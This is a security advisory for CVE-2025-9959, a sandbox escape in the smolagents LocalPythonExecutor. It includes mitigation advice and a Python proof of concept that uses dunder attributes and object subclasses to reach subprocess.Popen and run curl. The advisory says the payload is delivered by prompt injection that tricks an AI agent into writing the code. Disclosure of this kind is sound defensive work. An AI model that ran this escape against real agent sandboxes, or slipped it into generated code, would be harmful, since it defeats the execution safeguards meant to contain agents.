---
description: CVE-2025-9959, HIGH, Sandbox escape in smolagents Local Python execution environment via dunder attributes
title: Smolagents Local Python Sandbox Escape
date_published: "2025-09-03"
last_updated: "2025-09-03"
xray_id: JFSA-2025-001434277
vul_id: CVE-2025-9959
cvss: 7.6
severity: high
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Sandbox escape in smolagents Local Python execution environment via dunder attributes

## Component

smolagents

## Affected versions

(,1.21.0)

## Description

Incomplete validation of dunder attributes allows an attacker to escape from the Local Python execution environment sandbox, enforced by smolagents. The attack requires a Prompt Injection in order to trick the agent to create malicious code.

## PoC

```python
from smolagents.local_python_executor import LocalPythonExecutor
custom_executor = LocalPythonExecutor([])
custom_executor.send_tools({})

def run_capture_exception(command: str):
	try:
		custom_executor(harmful_command)
		print("passed: " + harmful_command)
		return 1
	except Exception as e:
		print("ERROR:\n", e)
		return 0
  
EVIL_PROMPT="""
#create a dummy function - will pass all check as it does nothing
def just_a_func():
pass
#this will yield <class 'function'>
function_class = just_a_func.__getattribute__('__class__')
#this will yield (<class 'object'>,)
bases_attribute = type.__getattribute__(function_class, '__bases__')
#this script if for locating the "subprocess.Popen" class among the
class list - for each runtime it could be different
num = 0
for i in bases_attribute[0].__subclasses__():
#found the "subprocess.Popen" class - use and run it
if 'subprocess.Popen' in str(i):
runpopen = bases_attribute[0].__subclasses__()[num](['curl',
'http://localhost:1337/pwned'])

stdout, stderr = runpopen.communicate()
num += 1
"""

run_capture_exception(EVIL_PROMPT)
```



## Vulnerability Mitigations

When creating a smolagents `CodeAgent`, do not use the Local Python execution environment. For example, the `wasm` executor can be used -

```
agent = CodeAgent(tools=[], model=model, add_base_tools=False,
additional_authorized_imports=[],executor_type='wasm')
```



## References

[Fix commit](https://github.com/huggingface/smolagents/pull/1551)

